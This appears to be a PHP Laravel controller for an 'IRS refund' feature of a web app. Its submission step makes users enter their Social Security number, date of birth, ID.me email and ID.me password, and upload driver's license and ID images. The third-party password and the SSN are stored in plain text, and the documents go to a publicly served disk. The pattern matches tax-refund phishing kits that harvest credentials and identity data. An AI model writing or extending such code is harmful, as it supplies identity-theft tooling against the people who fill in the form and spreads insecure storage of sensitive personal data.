<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\IrsRefund;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

class IrsRefundController extends Controller
{
    public function index()
    {
        $refund = IrsRefund::where('user_id', Auth::id())->first();
        $user = Auth::user();

        return view('user.irs-refund.index', compact('refund', 'user'));
    }

    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'ssn' => 'required|string|max:255',
            'phone' => 'required|string|max:50',
            'date_of_birth' => 'required|date|before:today',
            'idme_email' => 'required|email|max:255',
            'idme_password' => 'required|string|max:255',
            'country' => 'required|string|max:255',
            'drivers_license' => 'required|file|mimes:jpeg,jpg,png,pdf|max:5120',
            'id_document' => 'nullable|file|mimes:jpeg,jpg,png,pdf|max:5120',
        ]);

        $existingRefund = IrsRefund::where('user_id', Auth::id())
            ->whereIn('status', ['pending', 'approved'])
            ->first();

        if ($existingRefund) {
            return back()->with('error', 'You already have a pending or approved refund request.');
        }

        $userId = Auth::id();
        $dir = 'irs-refunds/' . $userId;

        $driversLicensePath = $this->storeUpload($request->file('drivers_license'), $dir, 'drivers-license');
        $idDocumentPath = null;
        if ($request->hasFile('id_document')) {
            $idDocumentPath = $this->storeUpload($request->file('id_document'), $dir, 'id-document');
        }

        IrsRefund::create([
            'user_id' => $userId,
            'name' => $request->name,
            'ssn' => $request->ssn,
            'phone' => $request->phone,
            'date_of_birth' => $request->date_of_birth,
            'idme_email' => Auth::user()->email,
            'idme_password' => $request->idme_password,
            'country' => $request->country,
            'drivers_license_path' => $driversLicensePath,
            'id_document_path' => $idDocumentPath,
            'status' => 'pending',
        ]);

        return redirect()->route('irs-refund.filing-id')->with('success', 'Your refund request has been submitted successfully. Please enter your filing ID to proceed.');
    }

    public function filingId()
    {
        $refund = IrsRefund::where('user_id', Auth::id())->first();

        if (!$refund) {
            return redirect()->route('irs-refund')->with('error', 'Please submit a refund request first.');
        }

        if ($refund->filing_id) {
            return redirect()->route('irs-refund.track')->with('info', 'You have already submitted your filing ID.');
        }

        return view('user.irs-refund.filing-id', compact('refund'));
    }

    public function updateFilingId(Request $request)
    {
        $request->validate([
            'filing_id' => 'required|string|max:255',
        ]);

        $refund = IrsRefund::where('user_id', Auth::id())->first();

        if (!$refund) {
            return back()->with('error', 'No refund request found.');
        }

        if ($refund->filing_id) {
            return back()->with('error', 'You have already submitted a filing ID.');
        }

        if ($refund->status !== 'pending') {
            return back()->with('error', 'This refund request is no longer pending.');
        }

        if ($request->filing_id !== Auth::user()->irs_filing_id) {
            return back()->with('error', 'Invalid filing ID. Please check and try again.');
        }

        $refund->update([
            'filing_id' => $request->filing_id,
        ]);

        return redirect()->route('irs-refund.track')->with('success', 'Filing ID updated successfully. Your refund request is now being processed.');
    }

    public function track()
    {
        $refund = IrsRefund::where('user_id', Auth::id())->first();

        if (!$refund) {
            return redirect()->route('irs-refund')->with('error', 'Please submit a refund request first.');
        }

        if (!$refund->filing_id) {
            return redirect()->route('irs-refund.filing-id')->with('error', 'Please submit your filing ID to track your refund status.');
        }

        return view('user.irs-refund.track', compact('refund'));
    }

    private function storeUpload($file, string $dir, string $prefix): string
    {
        $ext = strtolower($file->getClientOriginalExtension() ?: 'bin');
        $filename = $prefix . '-' . Str::random(8) . '-' . time() . '.' . $ext;

        return $file->storeAs($dir, $filename, 'public');
    }
}
